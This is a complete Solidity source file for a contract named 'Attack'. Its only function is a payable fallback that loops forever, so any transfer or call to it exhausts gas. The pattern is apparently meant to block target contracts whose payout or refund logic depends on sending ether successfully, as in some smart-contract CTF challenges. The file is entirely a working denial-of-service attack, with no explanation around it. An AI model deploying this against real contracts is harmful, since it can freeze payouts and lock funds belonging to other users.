// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
	fallback() external payable {
		while(true) {}
	}
}
